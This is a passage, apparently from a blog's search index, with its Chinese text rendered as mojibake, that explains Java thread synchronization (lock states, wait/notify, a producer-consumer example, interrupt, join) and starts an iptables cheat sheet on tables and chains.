Wordï¼Œå¦‚æœå½“å‰æ²¡æœ‰å¯¹è±¡æŒæœ‰åŒæ­¥ä½“çš„é”ï¼Œé‚£ä¹ˆç›´æ¥å°†åŒæ­¥ä½“çš„é”ä¿®æ”¹çš„è½»é‡é”ï¼Œå¦åˆ™ï¼Œè¯¥çº¿ç¨‹å°†è‡ªæ—‹è·å–é”ï¼Œç›´åˆ°è†¨èƒ€ä¸ºé‡é‡çº§é”ï¼Œä¿®æ”¹åŒæ­¥ä½“çš„Mark Wordä¸ºé‡é‡çº§é”ï¼Œç„¶åé˜»å¡è§£é”ä¸€æ—¦æœ‰å…¶ä»–çº¿ç¨‹å› æƒ³è·å–å½“å‰é”è€Œè†¨èƒ€ä¸ºé‡é‡çº§é”ï¼Œé‚£ä¹ˆè¿™ä¸ªçº¿ç¨‹å°†ä¼šé€šè¿‡CASæ›¿æ¢Mark Wordï¼Œç„¶åå¤±è´¥ï¼Œè§£é”ï¼Œå¹¶ä¸”å”¤é†’å…¶ä»–ç­‰å¾…çº¿ç¨‹ã€‚ é‡é‡çº§é”ä¼šé˜»å¡ï¼Œä¸æ¶ˆè€—cpuèµ„æºï¼Œä½†æ˜¯å“åº”æ—¶é—´è¾ƒæ…¢synchronizedå†…éƒ¨ä¹Ÿæ˜¯åˆ©ç”¨äº†é”ã€‚æ¯ä¸€ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªè‡ªå·±çš„monitorï¼Œå¿…é¡»å…ˆè·å–è¿™ä¸ªmonitorå¯¹è±¡æ‰èƒ½å¤Ÿè¿›å…¥åŒæ­¥å—æˆ–åŒæ­¥æ–¹æ³•ï¼Œè€Œè¿™ä¸ªmonitorå¯¹è±¡çš„è·å–æ˜¯æ’ä»–çš„ï¼Œä¹Ÿå°±æ˜¯åŒä¸€æ—¶åˆ»åªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹è·å–åˆ°è¿™ä¸ªmonitor è½»é‡çº§é”å’Œåå‘é” ç±»ä¼¼çš„ï¼Œsynchronizedä¿®é¥°çš„instance methodåœ¨ç¼–è¯‘åæ·»åŠ äº†ä¸€ä¸ªACC_SYNCHRONIZEDçš„flagï¼ŒåŒæ­¥æ˜¯é€šè¿‡è¿™ä¸ªæ ‡å¿—å®ç°çš„ã€‚ å›é¡¾ä¸€ä¸‹ç”¨notify,wait,synchronizedå®ç°çš„ç”Ÿäº§è€…-æ¶ˆè´¹è€…æ¨¡å‹åŸºæœ¬çš„æ€è·¯å°±æ˜¯ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…å…±åŒæŒæœ‰ä¸€ä¸ªé”ï¼ˆéšä¾¿newä¸€ä¸ªObjectå‡ºæ¥å°±æ˜¯äº†ï¼‰ï¼Œç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…éƒ½extends Threadã€‚ç”Ÿäº§è€…æ¯æ¬¡ç”Ÿäº§ä¸€ä¸ªéƒ½ä¼šnotifyAllï¼Œæ¶ˆè´¹è€…æ¯æ¬¡æ¶ˆè´¹ä¸€ä¸ªéƒ½ä¼šnotifyAll åœ¨Javaä¸­ï¼Œæ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸¤ä¸ªæ± ï¼Œé”(monitor)æ± å’Œç­‰å¾…æ± é”æ±  :å‡è®¾çº¿ç¨‹Aå·²ç»æ‹¥æœ‰äº†æŸä¸ªå¯¹è±¡(æ³¨æ„:ä¸æ˜¯ç±»)çš„é”ï¼Œè€Œå…¶å®ƒçš„çº¿ç¨‹æƒ³è¦è°ƒç”¨è¿™ä¸ªå¯¹è±¡çš„æŸä¸ªsynchronizedæ–¹æ³•(æˆ–è€…synchronizedå—)ï¼Œç”±äºè¿™äº›çº¿ç¨‹åœ¨è¿›å…¥å¯¹è±¡çš„synchronizedæ–¹æ³•ä¹‹å‰å¿…é¡»å…ˆè·å¾—è¯¥å¯¹è±¡çš„é”çš„æ‹¥æœ‰æƒï¼Œä½†æ˜¯è¯¥å¯¹è±¡çš„é”ç›®å‰æ­£è¢«çº¿ç¨‹Aæ‹¥æœ‰ï¼Œæ‰€ä»¥è¿™äº›çº¿ç¨‹å°±è¿›å…¥äº†è¯¥å¯¹è±¡çš„é”æ± ä¸­ã€‚ç­‰å¾…æ±  :å‡è®¾ä¸€ä¸ªçº¿ç¨‹Aè°ƒç”¨äº†æŸä¸ªå¯¹è±¡çš„wait()æ–¹æ³•ï¼Œçº¿ç¨‹Aå°±ä¼šé‡Šæ”¾è¯¥å¯¹è±¡çš„é”(å› ä¸ºwait()æ–¹æ³•å¿…é¡»å‡ºç°åœ¨synchronizedä¸­ï¼Œè¿™æ ·è‡ªç„¶åœ¨æ‰§è¡Œwait()æ–¹æ³•ä¹‹å‰çº¿ç¨‹Aå°±å·²ç»æ‹¥æœ‰äº†è¯¥å¯¹è±¡çš„é”)ï¼ŒåŒæ—¶çº¿ç¨‹Aå°±è¿›å…¥åˆ°äº†è¯¥å¯¹è±¡çš„ç­‰å¾…æ± ä¸­ã€‚å¦‚æœå¦å¤–çš„ä¸€ä¸ªçº¿ç¨‹è°ƒç”¨äº†ç›¸åŒå¯¹è±¡çš„notifyAll()æ–¹æ³•ï¼Œé‚£ä¹ˆå¤„äºè¯¥å¯¹è±¡çš„ç­‰å¾…æ± ä¸­çš„çº¿ç¨‹å°±ä¼šå…¨éƒ¨è¿›å…¥è¯¥å¯¹è±¡çš„é”æ± ä¸­ï¼Œå‡†å¤‡äº‰å¤ºé”çš„æ‹¥æœ‰æƒã€‚å¦‚æœå¦å¤–çš„ä¸€ä¸ªçº¿ç¨‹è°ƒç”¨äº†ç›¸åŒå¯¹è±¡çš„notify()æ–¹æ³•ï¼Œé‚£ä¹ˆä»…ä»…æœ‰ä¸€ä¸ªå¤„äºè¯¥å¯¹è±¡çš„ç­‰å¾…æ± ä¸­çš„çº¿ç¨‹(éšæœº)ä¼šè¿›å…¥è¯¥å¯¹è±¡çš„é”æ± . ä¹Ÿå³æ˜¯è¢«notifyçš„çº¿ç¨‹éƒ½åœ¨é”æ± é‡Œ(æœ‰æƒç«äº‰cpu)ï¼Œè‡ªå·±è°ƒç”¨waitçš„çº¿ç¨‹éƒ½åœ¨ç­‰å¾…æ± é‡Œ(æ— æƒç«äº‰cpu)ã€‚ é‚£ä¹ˆä»€ä¹ˆæ—¶å€™ç«äº‰å‘¢ï¼ŒæŒæœ‰é”çš„çº¿ç¨‹è‡ªå·±wait(é‡Šæ”¾é”)äº†ï¼Œé‚£ä¹ˆæœ‰æƒç«äº‰çš„çº¿ç¨‹å°±å¼€å§‹ç«äº‰ï¼Œè·å¾—é”çš„è¿›å…¥åŒæ­¥ä»£ç å—æˆ–è€…åŒæ­¥æ–¹æ³•ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯notify/notifyAllæ–¹æ³•è°ƒç”¨åï¼Œå¹¶ä¸ä¼šé©¬ä¸Šé‡Šæ”¾ç›‘è§†å™¨é”ï¼Œè€Œæ˜¯åœ¨ç›¸åº”çš„synchronized(){}/synchronizedæ–¹æ³•æ‰§è¡Œç»“æŸåæ‰è‡ªåŠ¨é‡Šæ”¾é”ã€‚ waitæ–¹æ³•å°±æ˜¯å°†å½“å‰çº¿ç¨‹åŠ å…¥objectçš„waitSetåŒæ—¶é‡Šæ”¾é”ï¼ˆç†è§£æˆä¸€ä¸ªhashsetä¹Ÿè¡Œï¼‰ï¼ŒnotifyAllåˆ™æ˜¯æŠŠwaitseté‡Œé¢çš„å†…å®¹å…¨éƒ¨æŒªåˆ°blockedé˜Ÿåˆ—ä¸­ï¼Œåœ¨notifyAllçš„çº¿ç¨‹æ‰§è¡Œå®Œæ¯•é‡Šæ”¾é”ä¹‹åï¼ŒæŒ‘é€‰ä¸€ä¸ªè·å¾—é”ã€‚JVMæºç åˆ†æä¹‹Object.wait/notifyå®ç° oracleçš„æ–‡æ¡£ä¸Šè¯´æ˜äº†,waitæœ‰ä¸€ä¸ªspurious wakeup) æ˜¯å‡ºäºperformanceè€ƒè™‘ï¼Œè¡¨ç°ä¸ºwaitçš„çº¿ç¨‹ä¸éœ€è¦notifyä¹Ÿèƒ½è‡ªå·±é†’è¿‡æ¥ã€‚(æ–‡æ¡£ä¸­ä¹ŸæŒ‡å‡ºäº†ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆæ¯ä¸€ä¸ªwaitéƒ½è¦åŒ…åœ¨ä¸€ä¸ªwhile loopé‡Œé¢çš„åŸå› )ã€‚è¿™ä¸€ç°è±¡åœ¨æŸäº›osä¸Šï¼ŒåŒ…æ‹¬linuxä¸Šå°±æœ‰ã€‚Effective javaé‡Œé¢è¯´è¦æŠŠwaitå†™åœ¨ä¸€ä¸ªwhileæ£€æŸ¥é‡Œé¢ // The standard idiom for calling the wait method in Java synchronized (sharedObject) { while (condition) { sharedObject.wait(); // å°±æ˜¯ä¸ºäº†é˜²æ­¢spurious wakeup } // do action based upon condition e.g. take or put into queue } how not to do java concurrency ä»¥ä¸‹ä»£ç éªŒè¯é€šè¿‡ public class Test1 { private static int count = 0; private static final int FULL = 5; private static final String LOCK = &quot;lock&quot;; public static void main(String[] args) { Test1 instance = new Test1(); new Thread(instance.new Producer()).start(); new Thread(instance.new Consumer()).start(); } class Producer implements Runnable{ @Override public void run() { for (int i = 0; i &lt; 10; i++) { synchronized (LOCK){ while (count==FULL){ try{ System.out.println(&quot;PRODUCER WILL WAITING&quot;); LOCK.wait(); System.out.println(&quot;PRODUCER END WAITING&quot;); // è¿›å…¥ wait()æ–¹æ³•åï¼Œå½“å‰çº¿ç¨‹é‡Šæ”¾é”ã€‚åœ¨ä» wait()è¿”å›å‰ï¼Œçº¿ç¨‹ä¸å…¶ä»–çº¿ç¨‹ç«äº‰é‡æ–°è·å¾—é” }catch (Exception e){ e.printStackTrace(); } } count++; System.out.println(Thread.currentThread().getName() + &quot;ç”Ÿäº§è€…ç”Ÿäº§ï¼Œç›®å‰æ€»å…±æœ‰&quot; + count); LOCK.notifyAll();//å½“å‰å¤„åœ¨waitçŠ¶æ€çš„çº¿ç¨‹ä¸ä¼šé©¬ä¸Šè·å¾—é” } //é€€å‡ºsynchronizeä»£ç å—ä¹‹åï¼Œç¨‹åºé€€å‡º synchronized ä»£ç å—åï¼Œå½“å‰çº¿ç¨‹æ‰ä¼šé‡Šæ”¾é”ï¼Œwaitæ‰€åœ¨çš„çº¿ç¨‹ä¹Ÿæ‰å¯ä»¥è·å–è¯¥å¯¹è±¡é” } } } class Consumer implements Runnable { @Override public void run() { for (int i = 0; i &lt; 10; i++) { synchronized (LOCK){ while (count==0){ try { System.out.println(&quot;CONSUMER WILL WAITING&quot;); LOCK.wait(); System.out.println(&quot;CONSUMER END WAITING&quot;); // è¿›å…¥ wait()æ–¹æ³•åï¼Œå½“å‰çº¿ç¨‹é‡Šæ”¾é”ã€‚åœ¨ä» wait()è¿”å›å‰ï¼Œçº¿ç¨‹ä¸å…¶ä»–çº¿ç¨‹ç«äº‰é‡æ–°è·å¾—é” } catch (InterruptedException e) { e.printStackTrace(); } } count--; System.out.println(Thread.currentThread().getName()+&quot;æ¶ˆè´¹è€…æ¶ˆè´¹ï¼Œå½“å‰è¿˜å‰©ä¸‹&quot;+count+&quot;ä¸ª&quot;); LOCK.notifyAll(); } } } } } å¯¹åº”è¾“å‡ºå¦‚ä¸‹ï¼ˆè¾“å‡ºç»“æœä¸ç¡®å®šï¼‰ Thread-0ç”Ÿäº§è€…ç”Ÿäº§ï¼Œç›®å‰æ€»å…±æœ‰1 Thread-0ç”Ÿäº§è€…ç”Ÿäº§ï¼Œç›®å‰æ€»å…±æœ‰2 Thread-0ç”Ÿäº§è€…ç”Ÿäº§ï¼Œç›®å‰æ€»å…±æœ‰3 Thread-0ç”Ÿäº§è€…ç”Ÿäº§ï¼Œç›®å‰æ€»å…±æœ‰4 Thread-0ç”Ÿäº§è€…ç”Ÿäº§ï¼Œç›®å‰æ€»å…±æœ‰5 PRODUCER WILL WAITING //producerçº¿ç¨‹å¼€å§‹waitï¼Œé˜»å¡åœ¨è¿™é‡Œ Thread-1æ¶ˆè´¹è€…æ¶ˆè´¹ï¼Œå½“å‰è¿˜å‰©ä¸‹4ä¸ª // æ¶ˆè´¹è€…çº¿ç¨‹è¿›å…¥Synchronizedä»£ç å— PRODUCER END WAITING //æ¶ˆè´¹è€…æ¯æ¬¡åœ¨æ‰§è¡Œå®Œsynchronizedä»£ç å—éƒ½ä¼šnotifyAllï¼Œæ‰€ä»¥ç”Ÿäº§è€…åˆå¼€å§‹ç«äº‰é”ï¼Œè¿™ä¸€æ¬¡å±…ç„¶æŠ¢åˆ°äº†ï¼Œäºæ˜¯ä¹‹å‰çš„waitè¿”å› Thread-0ç”Ÿäº§è€…ç”Ÿäº§ï¼Œç›®å‰æ€»å…±æœ‰5 //å‘ç°æ»¡äº†ï¼Œé‡å¤ä¸Šé¢çš„waitæ­¥éª¤ PRODUCER WILL WAITING //é‡Šæ”¾é” Thread-1æ¶ˆè´¹è€…æ¶ˆè´¹ï¼Œå½“å‰è¿˜å‰©ä¸‹4ä¸ª //é”è¢«åˆ«äººæŠ¢åˆ° PRODUCER END WAITING //åˆ«äººnotifyå¯¼è‡´æˆ‘æŠ¢åˆ°äº†é” Thread-0ç”Ÿäº§è€…ç”Ÿäº§ï¼Œç›®å‰æ€»å…±æœ‰5 PRODUCER WILL WAITING Thread-1æ¶ˆè´¹è€…æ¶ˆè´¹ï¼Œå½“å‰è¿˜å‰©ä¸‹4ä¸ª PRODUCER END WAITING Thread-0ç”Ÿäº§è€…ç”Ÿäº§ï¼Œç›®å‰æ€»å…±æœ‰5 PRODUCER WILL WAITING Thread-1æ¶ˆè´¹è€…æ¶ˆè´¹ï¼Œå½“å‰è¿˜å‰©ä¸‹4ä¸ª PRODUCER END WAITING Thread-0ç”Ÿäº§è€…ç”Ÿäº§ï¼Œç›®å‰æ€»å…±æœ‰5 PRODUCER WILL WAITING Thread-1æ¶ˆè´¹è€…æ¶ˆè´¹ï¼Œå½“å‰è¿˜å‰©ä¸‹4ä¸ª PRODUCER END WAITING Thread-0ç”Ÿäº§è€…ç”Ÿäº§ï¼Œç›®å‰æ€»å…±æœ‰5 //ç”Ÿäº§è€…æœ€åä¸€æ¬¡ç”Ÿäº§ Thread-1æ¶ˆè´¹è€…æ¶ˆè´¹ï¼Œå½“å‰è¿˜å‰©ä¸‹4ä¸ª Thread-1æ¶ˆè´¹è€…æ¶ˆè´¹ï¼Œå½“å‰è¿˜å‰©ä¸‹3ä¸ª Thread-1æ¶ˆè´¹è€…æ¶ˆè´¹ï¼Œå½“å‰è¿˜å‰©ä¸‹2ä¸ª Thread-1æ¶ˆè´¹è€…æ¶ˆè´¹ï¼Œå½“å‰è¿˜å‰©ä¸‹1ä¸ª Thread-1æ¶ˆè´¹è€…æ¶ˆè´¹ï¼Œå½“å‰è¿˜å‰©ä¸‹0ä¸ª ä»ä»£ç æ‰§è¡Œé¡ºåºæ¥çœ‹ï¼Œwaitæ–¹æ³•è°ƒç”¨åï¼Œå½“å‰çº¿ç¨‹é˜»å¡ä½(è™½ç„¶è¿˜åœ¨ä¸€ä¸ªåŒæ­¥ä»£ç å—ä¸­ï¼Œç›´åˆ°åˆ«çš„çº¿ç¨‹notifyï¼Œè¿™ä¸ªwaitæ–¹æ³•æ‰ä¼šè¿”å›)ï¼Œæ­¤æ—¶å¦ä¸€ä¸ªçº¿ç¨‹ç«äº‰è·å–é”å¼€å§‹æ‰§è¡ŒåŒæ­¥ä»£ç å—ã€‚ synchronizedå¯¹äºå†…å­˜å¯è§æ€§çš„å½±å“javaå†…å­˜æ¨¡å‹ä¸€ä¸ªçº¿ç¨‹åœ¨è·å–åˆ°ç›‘è§†å™¨é”ä»¥åæ‰èƒ½è¿›å…¥ synchronized æ§åˆ¶çš„ä»£ç å—ï¼Œä¸€æ—¦è¿›å…¥ä»£ç å—ï¼Œé¦–å…ˆï¼Œè¯¥çº¿ç¨‹å¯¹äºå…±äº«å˜é‡çš„ç¼“å­˜å°±ä¼šå¤±æ•ˆï¼Œå› æ­¤ synchronized ä»£ç å—ä¸­å¯¹äºå…±äº«å˜é‡çš„è¯»å–éœ€è¦ä»ä¸»å†…å­˜ä¸­é‡æ–°è·å–ï¼Œä¹Ÿå°±èƒ½è·å–åˆ°æœ€æ–°çš„å€¼ã€‚é€€å‡ºä»£ç å—çš„æ—¶å€™çš„ï¼Œä¼šå°†è¯¥çº¿ç¨‹å†™ç¼“å†²åŒºä¸­çš„æ•°æ®åˆ·åˆ°ä¸»å†…å­˜ä¸­ï¼Œæ‰€ä»¥åœ¨ synchronized ä»£ç å—ä¹‹å‰æˆ– synchronized ä»£ç å—ä¸­å¯¹äºå…±äº«å˜é‡çš„æ“ä½œéšç€è¯¥çº¿ç¨‹é€€å‡º synchronized å—ï¼Œä¼šç«‹å³å¯¹å…¶ä»–çº¿ç¨‹å¯è§ï¼ˆè¿™å¥è¯çš„å‰ææ˜¯å…¶ä»–è¯»å–å…±äº«å˜é‡çš„çº¿ç¨‹ä¼šä»ä¸»å†…å­˜è¯»å–æœ€æ–°å€¼ï¼‰ã€‚ Thread.sleepå¹¶ä¸é‡Šæ”¾é”ï¼Œåªæ˜¯è®©å‡ºcpuæ‰§è¡Œæ—¶é—´Thread.sleepå’ŒObject.waitéƒ½ä¼šæš‚åœå½“å‰çš„çº¿ç¨‹ï¼Œå¯¹äºCPUèµ„æºæ¥è¯´ï¼Œä¸ç®¡æ˜¯å“ªç§æ–¹å¼æš‚åœçš„çº¿ç¨‹ï¼Œéƒ½è¡¨ç¤ºå®ƒæš‚æ—¶ä¸å†éœ€è¦CPUçš„æ‰§è¡Œæ—¶é—´ã€‚OSä¼šå°†æ‰§è¡Œæ—¶é—´åˆ†é…ç»™å…¶å®ƒçº¿ç¨‹ã€‚åŒºåˆ«æ˜¯ï¼Œè°ƒç”¨waitåï¼Œéœ€è¦åˆ«çš„çº¿ç¨‹æ‰§è¡Œnotify/notifyAllæ‰èƒ½å¤Ÿé‡æ–°è·å¾—CPUæ‰§è¡Œæ—¶é—´ã€‚æ‰€ä»¥åœ¨åŒæ­¥ä»£ç å—é‡Œæ‰§è¡Œsleepæ˜¯ä¸€ä¸ªå¾ˆç³Ÿç³•çš„åšæ³• interruptä¸çº¿ç¨‹ä¸­æ–­//ä¸­æ–­çº¿ç¨‹ï¼ˆå®ä¾‹æ–¹æ³•ï¼‰ public void Thread.interrupt(); //åˆ¤æ–­çº¿ç¨‹æ˜¯å¦è¢«ä¸­æ–­ï¼ˆå®ä¾‹æ–¹æ³•ï¼‰ public boolean Thread.isInterrupted(); //åˆ¤æ–­æ˜¯å¦è¢«ä¸­æ–­å¹¶æ¸…é™¤å½“å‰ä¸­æ–­çŠ¶æ€ï¼ˆé™æ€æ–¹æ³•ï¼‰ï¼Œè¯¥æ–¹æ³•ä¼šclearæ‰interruptæ ‡å¿— public static boolean Thread.interrupted(); è¿™ä¸ªè¦èƒŒä¸‹æ¥,javadocçš„æè¿°ï¼Œå› ä¸ºä¸åŒæ“ä½œç³»ç»Ÿä¸Šçš„å®ç°ç»†èŠ‚å¯èƒ½æœ‰å·®å¼‚: /** * Interrupts this thread. * * &lt;p&gt; Unless the current thread is interrupting itself, which is * always permitted, the {@link #checkAccess() checkAccess} method * of this thread is invoked, which may cause a {@link * SecurityException} to be thrown. * * &lt;p&gt; If this thread is blocked in an invocation of the {@link * Object#wait() wait()}, {@link Object#wait(long) wait(long)}, or {@link * Object#wait(long, int) wait(long, int)} methods of the {@link Object} * class, or of the {@link #join()}, {@link #join(long)}, {@link * #join(long, int)}, {@link #sleep(long)}, or {@link #sleep(long, int)}, * methods of this class, then its interrupt status will be cleared and it * will receive an {@link InterruptedException}. * * &lt;p&gt; If this thread is blocked in an I/O operation upon an {@link * java.nio.channels.InterruptibleChannel InterruptibleChannel} * then the channel will be closed, the thread&#39;s interrupt * status will be set, and the thread will receive a {@link * java.nio.channels.ClosedByInterruptException}. * * &lt;p&gt; If this thread is blocked in a {@link java.nio.channels.Selector} * then the thread&#39;s interrupt status will be set and it will return * immediately from the selection operation, possibly with a non-zero * value, just as if the selector&#39;s {@link * java.nio.channels.Selector#wakeup wakeup} method were invoked. * * &lt;p&gt; If none of the previous conditions hold then this thread&#39;s interrupt * status will be set. &lt;/p&gt; * * &lt;p&gt; Interrupting a thread that is not alive need not have any effect. * * @throws SecurityException * if the current thread cannot modify this thread * * @revised 6.0 * @spec JSR-51 */ æ¦‚æ‹¬ä¸‹æ¥å°±æ˜¯åœ¨wait,i/oæ“ä½œï¼Œæˆ–è€…selectoræ“ä½œçš„ä¸­é—´è°ƒç”¨çº¿ç¨‹å¯¹è±¡çš„interruptæ–¹æ³•ä¼šæŠ›å‡ºInterruptedExceptionï¼Œå¦‚æœä¸æ˜¯ä¸Šè¿°ä¸‰ç§æƒ…å†µä¹‹ä¸€ï¼Œåˆ™å°†é‡ç½®isInterruptedçš„æ ‡å¿—ä½ã€‚ä¹Ÿå°±æ„å‘³ç€å¯¹äºè¿™ç§éé˜»å¡çš„çº¿ç¨‹æ˜¯ä¸ä¼šå› ä¸ºinterruptæ–¹æ³•è€Œåœä¸‹æ¥çš„ yieldçš„ç”¨æ³•yieldæ˜¯è®©å½“å‰çº¿ç¨‹ä»runningçš„çŠ¶æ€å˜æˆrunnableçš„çŠ¶æ€ï¼ˆä¸è¿‡è¿™ä¸ªæ–¹æ³•å¾ˆå°‘ç”¨åˆ°ï¼‰ joinçš„ç”¨æ³•å’Œpythonä¸€æ ·ï¼Œä¸»çº¿ç¨‹è°ƒç”¨childThread.join()å°±æ˜¯è®©ä¸»çº¿ç¨‹ç­‰å­çº¿ç¨‹æ‰§è¡Œå®Œäº†ä¹‹åå†å»æ‰§è¡Œåé¢çš„è¯­å¥ã€‚ä¸è¿‡ä»æºç æ¥çœ‹,joinè°ƒç”¨äº†waitã€‚ public final void join() throws InterruptedException { join(0); //è¿™é‡Œé¢è°ƒç”¨äº†waitæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯ä¸»çº¿ç¨‹ä¼šwaitä½ } public synchronized void start() { //Threadçš„startæ–¹æ³•ä¸­åšäº†ç›¸åº”çš„å¤„ç†ï¼Œæ‰€ä»¥å½“joinçš„çº¿ç¨‹æ‰§è¡Œå®Œæˆä»¥åï¼Œä¼šè‡ªåŠ¨å”¤é†’ä¸»çº¿ç¨‹ç»§ç»­å¾€ä¸‹æ‰§è¡Œ } è°ƒç”¨joinçš„çº¿ç¨‹æ€»å¾—è¢«å”¤é†’å•Š stackoverflowä¸Šè¯´æ˜¯åœ¨nativeå±‚é¢è°ƒç”¨çš„notifyã€‚æœ‰äººç¿»å‡ºæ¥openjdkçš„cppæºç  void JavaThread::run() { ... thread_main_inner(); } void JavaThread::thread_main_inner() { ... this-&gt;exit(false); delete this; } void JavaThread::exit(bool destroy_vm, ExitType exit_type) { ... // Notify waiters on thread object. This has to be done after exit() is called // on the thread (if the thread is the last thread in a daemon ThreadGroup the // group should have the destroyed bit set before waiters are notified). ensure_join(this); ... } static void ensure_join(JavaThread* thread) { // We do not need to grap the Threads_lock, since we are operating on ourself. Handle threadObj(thread, thread-&gt;threadObj()); assert(threadObj.not_null(), &quot;java thread object must exist&quot;); ObjectLocker lock(threadObj, thread); // Ignore pending exception (ThreadDeath), since we are exiting anyway thread-&gt;clear_pending_exception(); // Thread is exiting. So set thread_status field in java.lang.Thread class to TERMINATED. java_lang_Thread::set_thread_status(threadObj(), java_lang_Thread::TERMINATED); // Clear the native thread instance - this makes isAlive return false and allows the join() // to complete once we&#39;ve done the notify_all below java_lang_Thread::set_thread(threadObj(), NULL); lock.notify_all(thread); // Ignore pending exception (ThreadDeath), since we are exiting anyway thread-&gt;clear_pending_exception(); } ç­”æ¡ˆå°±åœ¨lock.notify_all(thread);è¿™é‡Œ unsafeè¿™ä¸ªç±»çš„æºç åœ¨sun.miscè¿™ä¸ªpackageä¸‹ï¼Œçœ‹æºç çš„è¯éœ€è¦å¯¼å…¥openjdkæºç å’Œå¤šçº¿ç¨‹ç›¸å…³çš„ç±»æ˜¯LockSupport,è®©ä¸€ä¸ªçº¿ç¨‹ä¼‘çœ çš„æ–¹æ³•ä½¿ç”¨çš„æ˜¯LockSupport.parkï¼ˆAQSä¸­æŒ‚èµ·çº¿ç¨‹çš„å°±æ˜¯åœ¨parkAndCheckInterruptä¸­ä½¿ç”¨äº†è¿™ä¸ªæ–¹æ³•ï¼‰è°ƒç”¨äº†Unsafe.parkæ–¹æ³•ï¼ˆè¿™æ˜¯ä¸ªnativeæ–¹æ³•ï¼Œc++çš„å®ç°ä¼¼ä¹æ˜¯ä½¿ç”¨äº†pthread_mutexï¼‰ å›¾è§£javaå¹¶å‘ pvæ“ä½œ å‚è€ƒç¾å›¢åšå®¢ä¸­å…³äºjavaé”çš„ä¸€ç¯‡æ–‡ç«  AQSè¿™ä¸ªjavaå¹¶å‘åŸºç¡€ç±»çš„å®ç°åŸç†","tags":[{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"},{"name":"tbd","slug":"tbd","permalink":"https://haldir65.github.io/tags/tbd/"}]},{"title":"iptablesé€ŸæŸ¥æ‰‹å†Œ","date":"2019-01-29T11:46:11.000Z","path":"2019/01/29/2019-01-29-iptables-cheatsheet/","text":"iptablesæ˜¯æ§åˆ¶linux å†…æ ¸netfilterçš„command line frontend toolï¼Œåªå­˜åœ¨äºlinuxå¹³å°ï¼Œæ˜¯system adminå¸¸ç”¨çš„é˜²ç«å¢™ã€‚(è™½ç„¶å·²ç»è¢«nftableså–ä»£äº†ï¼Œå­¦ä¹ ç‚¹ç½‘ç»œçŸ¥è¯†è¿˜æ˜¯å¾ˆæœ‰å¿…è¦) iptablesçš„manpageè¿™ä¹ˆå†™çš„ DESCRIPTIONIptables and ip6tables are used to set up, maintain, and inspect the tablesof IPv4 and IPv6 packet filter rules in the Linux kernel. Several differenttables may be defined. Each table contains a number of built-in chains andmay also contain user-defined chains.Each chain is a list of rules which can match a set of packets. Each rulespecifies what to do with a packet that matches. This is called a `targetâ€™,which may be a jump to a user-defined chain in the same table. æ¦‚å¿µ:iptableså‘½ä»¤éœ€è¦rootæƒé™æ‰§è¡Œæ¯ä¸ªè¡¨åŒ…å«æœ‰è‹¥å¹²ä¸ªä¸åŒçš„é“¾ï¼Œæ¯”å¦‚ filter è¡¨é»˜è®¤åŒ…å«æœ‰ INPUTï¼ŒFORWARDï¼ŒOUTPUT ä¸‰ä¸ªé“¾ã€‚iptablesæœ‰å››ä¸ªè¡¨ï¼Œåˆ†åˆ«æ˜¯ï¼šrawï¼Œnatï¼Œmangleå’Œfilterï¼Œæ¯ä¸ªè¡¨éƒ½æœ‰è‡ªå·±ä¸“é—¨çš„ç”¨å¤„ï¼Œæ¯”å¦‚æœ€å¸¸ç”¨filterè¡¨å°±æ˜¯ä¸“é—¨ç”¨æ¥åšåŒ…è¿‡æ»¤çš„ï¼Œè€Œ nat è¡¨æ˜¯ä¸“é—¨ç”¨æ¥åšNATçš„ã€‚ Chainé»˜è®¤çš„ChainåŒ…æ‹¬ INPUT â€”&gt; æ‰€æœ‰è¿›å…¥è¿™å°ä¸»æœºçš„è¿æ¥ FORWARD â€”&gt; å€Ÿç”±è¿™å°ä¸»æœºå‘å‡ºçš„ï¼ˆè·¯ç”±å™¨ï¼‰ OUTPUT â€”&gt; æ‰€æœ‰ä»è¿™å°ä¸»æœºå‘å‡ºå»çš„è¿æ¥ PREROUTING / POSTROUTING æ¯ä¸€æ¡Chainä¸Šéƒ½æœ‰ä¸€ä¸ªrulesçš„åˆ—è¡¨(ç”¨Aå»append,ç”¨Iå»Insert)å½“ç„¶è¿˜å¯ä»¥è‡ªå®šä¹‰Chain tableï¼ˆtableæ˜¯ä¸€ç³»åˆ—é’ˆå¯¹packetçš„åŒä¸€ç±»å†³ç­–çš„é›†åˆï¼Œè¡¨æ˜¯ä¸ºäº†æ–¹ä¾¿ç®¡ç†æå‡ºçš„é€»è¾‘æ¦‚å¿µï¼‰Mangle is to change packets (Type Of Service, Time To Live etc) on traversal.Nat is to put in NAT rules.Raw is to be used for marking and connection tracking.Filter is for filtering packets.(é»˜è®¤çš„ï¼Œå¦‚æœä¸åŠ -tçš„è¯é»˜è®¤éƒ½æ˜¯å¯¹è¿™ä¸ªè¡¨æ“ä½œ) è¡¨çš„ä¼˜å…ˆçº§æ‰€è°“ä¼˜å…ˆçº§å°±æ˜¯å¤„ç†çš„é¡ºåºï¼Œä»å·¦åˆ°å³ä¼˜å…ˆçº§ä¾æ¬¡é™ä½ï¼šraw -&gt; mangle -&gt; nat -&gt; filterï¼› rawï¼Œä¼˜å…ˆçº§æœ€é«˜ï¼Œé€šå¸¸ä¸NOTRACKä¸€èµ·ä½¿ç”¨ï¼Œç”¨äºè·³è¿‡è¿æ¥è·Ÿè¸ªï¼ˆconntrackï¼‰å’Œ nat è¡¨çš„å¤„ç†ï¼›mangleï¼Œä¿®æ”¹åŒ…å¤´éƒ¨çš„æŸäº›ç‰¹æ®Šæ¡ç›®ï¼Œå¦‚ TOSã€TTLã€æ‰“ä¸Šç‰¹æ®Šæ ‡è®° MARK ç­‰ï¼Œä»¥å½±å“åé¢çš„è·¯ç”±å†³ç­–ï¼›natï¼Œç”¨äºè¿›è¡Œç½‘ç»œåœ°å€è½¬æ¢ï¼Œå¦‚ SNATï¼ˆä¿®æ”¹æºåœ°å€ï¼‰ã€DNATï¼ˆä¿®æ”¹ç›®çš„åœ°å€ï¼‰ã€REDIRECT 